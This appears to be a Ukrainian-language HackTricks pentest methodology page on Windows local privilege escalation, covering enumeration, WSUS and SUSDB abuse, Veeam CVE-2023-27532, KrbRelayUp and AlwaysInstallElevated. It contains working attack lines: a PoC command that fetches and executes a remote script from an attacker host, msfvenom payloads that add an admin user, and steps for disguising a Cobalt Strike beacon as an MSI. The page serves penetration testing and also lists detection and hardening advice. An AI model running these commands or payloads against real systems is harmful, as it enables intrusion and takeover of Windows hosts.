# Підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний порядок переліку даних про систему також ґрунтується на спільнотних воркшопах і контрольних списках.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки містить доповідь DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs — DACLs/SACLs/ACEs

**Докладніше про ACLs — DACLs/SACLs/ACEs — дивіться на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби безпеки Windows

У Windows є різні механізми, які можуть **перешкодити вам збирати дані про систему**, запускати виконувані файли або навіть **виявляти вашу активність**. Перш ніж почати збирати дані для підвищення привілеїв, слід **прочитати** цю **сторінку** та **перелічити** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити редагування UEFI NVRAM в автономному режимі на DMA до завантаження та ланцюжок патчення пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / приховане підвищення привілеїв UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо обійти перевірки безпечного шляху AppInfo. Описаний тут спеціальний процес обходу UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису до реєстру від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився шлях LPE через **SMB на довільному порту**, за якого привілейована локальна NTLM-автентифікація відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перелік відомостей про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені виправлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти для версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) стане в пригоді для пошуку детальної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та можливі відповідні рекомендації; перш ніж вважати результат застосовним, перевірте точний продукт і оновлення, що замінюють попередні.

Для локального експлойту, призначеного для певної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай відповідає 32-бітному системному каталогу, тоді як `%windir%\Sysnative` надає цьому процесу доступ до системного каталогу нативної архітектури. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або кандидат на відсутнє KB-оновлення не доводить можливість експлуатації; звірте запущену збірку, встановлене оновлення або оновлення, що його замінює, архітектуру процесу та передумови експлойту з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032), що стосується конкретної проблеми.

**Локально, використовуючи відомості про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережено в змінних середовища якісь облікові дані або цінну інформацію?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли транскриптів PowerShell

Дізнатися, як увімкнути цю функцію, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрипції PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити файли до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Доступний для читання транскрипт є лише зачіпкою, якщо його вміст розкриває придатний для використання обліковий запис із вищими привілеями, а цей обліковий запис може ввійти в систему у відповідному контексті.

### Журналювання модулів PowerShell

Записуються відомості про виконання конвеєрів PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не записуватися.

Щоб увімкнути цю функцію, дотримуйтеся вказівок у розділі «Файли транскриптів» документації, вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowerShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повний журнал дій і вмісту під час виконання скрипту, що забезпечує документування кожного блоку коду в міру його виконання. Цей процес зберігає вичерпний аудиторський слід усіх дій, корисний для криміналістичного аналізу та дослідження шкідливої поведінки. Документування всіх дій під час виконання надає детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання для Script Block можна знайти у Windows Event Viewer за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Кінцева точка WSUS через HTTP — це привід перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політик клієнта щодо довіри до оновлень і їх встановлення. Сам URL не свідчить про можливість виконання коду. [Microsoft рекомендує використовувати TLS для метаданих WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або наведене нижче в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримали одну з таких відповідей:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану внутрішню службу. Це підтверджує одну з передумов для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення або його встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, цей конкретний налаштований кінцевий вузол WSUS не вибирається цією політикою.

Для експлуатації цих вразливостей можна використовувати такі інструменти, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus). Це озброєні MiTM-скрипти експлойтів для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Дослідження можна прочитати тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця помилка експлуатує таку ваду:

> Якщо ми можемо змінювати проксі-сервер для нашого локального користувача, а Windows Updates використовує проксі-сервер, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехопити власний трафік і виконати код на нашому комп’ютері з підвищеними привілеями.
>
> Крім того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо створити самопідписаний сертифікат для імені вузла WSUS і додати його до сховища сертифікатів поточного користувача, ми зможемо перехоплювати трафік WSUS як HTTP, так і HTTPS. WSUS не використовує механізми на кшталт HSTS для перевірки сертифіката за принципом «довіряти під час першого використання». Якщо сертифікат, який надається, є довіреним для користувача та має правильне ім’я вузла, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (щойно його буде оприлюднено).

### Оновлення WSUS, керовані адміністратором

Окремий шлях можливий, якщо поточна ідентичність може **публікувати й затверджувати** оновлення на сервері WSUS. Перевірте ефективне членство в групі сервера `WSUS Administrators` та будь-які делеговані дозволи WSUS, а потім визначте групу комп’ютерів-клієнтів, якій буде призначено затверджене оновлення. [Microsoft вимагає привілеїв WSUS Administrator для затвердження оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [описує зв’язок довіри під час публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що кандидатне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Саме лише значення HTTP `WUServer` або назва групи не підтверджують виконання цих умов.

### Зловживання користувацькими оновленнями SUSDB: непідписані корисні навантаження через `.txt`/`.esd`

Це інше порушення межі довіри, ніж перехоплення HTTP-з’єднання WSUS: передумовою є достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)**, щоб опублікувати й затвердити користувацьке оновлення. Один із практичних способів отримати такий доступ — ретранслювати облікові дані комп’ютерного облікового запису upstream WSUS на окремий сервер MSSQL, де розміщено `SUSDB`. Точні передумови залежать від розгортання, тому спершу перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, що ретранслює автентифікацію клієнта WSUS з HTTP/8530 до LDAP, SMB або AD CS, описано в розділі [Зловживання HTTP WSUS для ретрансляції NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Створення, призначення цільовій системі та затвердження оновлення

Робочий процес користувацького оновлення використовує легітимні процедури WSUS як обмежений API для публікації. Важливі переходи стану:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження фрагментів XML із попередніми вимогами, локалізованими даними та розширеннями | `spSaveXMLFragment` |
| Прив’язка дайджесту вмісту до контрольованої зловмисником URL-адреси | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Затвердження встановлення для цієї групи | `spDeployUpdate` із `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають збігатися в імпортованих метаданих і фрагментах. Після призначення URL-адреси вмісту та цільової групи остаточне затвердження має приблизно такий вигляд; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису на основі розширення

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; `CheckCertificateSignature` тоді пропускається без попередньої перевірки, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt` може пройти перевірку вмісту, а згодом бути запущеним обробником інсталяції оновлення з командного рядка. Це помилка політики/плутанини типів, а не підробка підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Підготовка staging-сервера та автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Сервер-джерело має відповідати вимогам BITS до HTTP: самого лише доступного URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє помилку синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, потрібний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для розміщення вмісту. Мінімальний приклад запуску в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Непомітне виконання та persistence через повторні спроби

Взаємодія на стороні клієнта залежить від політики. Параметр `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, опція `4 - Auto download and schedule install`, дає змогу завантажувати й установлювати схвалене оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, знову пропонувалося одразу після завершення процесу callback, тож повторні спроби можуть перетворитися на recurring execution persistence; це помітно, оскільки клієнт показує стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні напрями перевірки на сервері й клієнті в межах цього ланцюжка:<sup>[[39]](#references)</sup>

- Аудитуйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; перевіряйте нові групи цільового розгортання, зовнішні джерела вмісту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними principals (особливо обліковими записами, що не є обліковими записами комп’ютерів).
- Перевіряйте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не покладайтеся на суфікс.
- Шукайте повторні невдалі спроби інсталяції Windows Update, а також виконання PE або неочікувану активність дочірніх процесів/мережі з вмісту, що має назви з розширеннями `.txt` чи `.esd`.
- Якщо це підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте й аудіюйте права `EXECUTE` для процедур custom-update.

## Сторонні автоматичні засоби оновлення та IPC агентів (local privesc)

Багато корпоративних агентів надають IPC-інтерфейс localhost і привілейований канал оновлення. Якщо реєстрацію можна спрямувати на сервер зловмисника, а засіб оновлення довіряє підробленому кореневому CA або має слабкі перевірки підписувача, локальний користувач може доставити шкідливий MSI, який служба SYSTEM встановить. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання, яка за замовчуванням працює через **TCP/9401**. [Рекомендації Veeam](https://www.veeam.com/kb4424) описують розкриття облікових даних зашифрованої бази конфігурації без автентифікації в межах мережевого периметра резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тож перевірте її фактичну адресу та PID.

- **Recon**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані патчів. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка наявності патчів.
- **Мінімальні виправлені версії**: Veeam вказує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені версії; попередні версії вразливі. Самої чотирискладової версії файлу недостатньо, щоб відрізнити невиправлену базову збірку від пізнішого патча з тим самим номером збірки. Перш ніж вважати граничну збірку виправленою, перевірте ідентифікатор патча за [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Exploit**: розмістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL-файлами Veeam в одному каталозі, а потім запустіть payload від імені SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Наведений PoC демонструє виконання команд від імені SYSTEM, якщо виконуються додаткові передумови; в advisory постачальника описано проблему розкриття облікових даних.
## KrbRelayUp

Локальний Kerberos relay може підвищити привілеї від входу з нижчими привілеями до запису в каталог із привілеями, якщо відповідний COM server автентифікується, а relayed principal має права на цільовий об’єкт. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) обидва варіанти запису LDAP: RBCD та `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих шляхів. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка shadow-credential потрібні права на запис key-credential і KDC, що підтримує шлях автентифікації за сертифікатом. Жоден із цих шляхів не випливає лише з членства в домені.

Перевірте фактичні політики DC щодо [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об’єкта для relayed identity, а також рівні автентифікації та impersonation вибраного COM class. Важливі тип входу користувача та контекст облікових даних: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. Брандмауер/OXID routing і встановлені оновлення також можуть вплинути на результат. Розглядайте permissive policy або відповідний ACL як привід для перевірки; пасивне перерахування не повинно запускати COM coercion, relay authentication або запис до каталогу. Shadow credential облікового запису комп’ютера може привести до квитка комп’ютера і лише за умови, що цей обліковий запис має необхідні права реплікації каталогу, — до окремого шляху DCSync.

Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, дивіться [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 ключі реєстру **увімкнено** (значення — **0x1**), користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який запитує додавання користувача/групи (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цього інструмента. Зверніть увагу: можна створити wrapper для файлу "**.bat**", якщо ви **лише** хочете **виконати** **командні рядки**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- **Згенеруйте** за допомогою Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Назвіть проєкт, наприклад **AlwaysPrivesc**, укажіть `C:\privesc` як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Натискайте **Next**, доки не дійдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виберіть проєкт **AlwaysPrivesc** в **Solution Explorer** і в розділі **Properties** змініть **TargetPlatform** із **x86** на **x64**.
  - Можна змінити й інші властивості, як-от **Author** і **Manufacturer**, щоб установлена програма виглядала легітимніше.
- Клацніть проєкт правою кнопкою миші та виберіть **View > Custom Actions**.
- Клацніть **Install** правою кнопкою миші та виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це гарантує, що Beacon payload запуститься відразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу x64.

### Встановлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивірус і засоби виявлення

### Параметри аудиту

Ці параметри визначають, що саме **реєструється**, тож зверніть на це увагу.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локального адміністратора**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп’ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory, і доступ до них мають лише користувачі з достатніми дозволами через ACL, що дає їм змогу переглядати паролі локального адміністратора за наявності відповідної авторизації.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо функцію ввімкнено, **паролі зберігаються в LSASS (Local Security Authority Subsystem Service) у відкритому тексті**.\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Докладніше про захист LSA**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** з’явився у **Windows 10**. Його призначення — захищати облікові дані, що зберігаються на пристрої, від таких загроз, як атаки pass-the-hash. [**Більше інформації про Credential Guard доступно тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Облікові дані домену** автентифікуються **Локальним центром безпеки** (LSA) і використовуються компонентами операційної системи. Коли дані для входу користувача автентифікуються зареєстрованим пакетом безпеки, для цього користувача зазвичай створюються облікові дані домену.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелічити користувачів і групи

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до певної привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся про привілейовані групи та про те, як зловживати ними для підвищення привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляція токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перейдіть на наступну сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати ними:


{{#ref}}
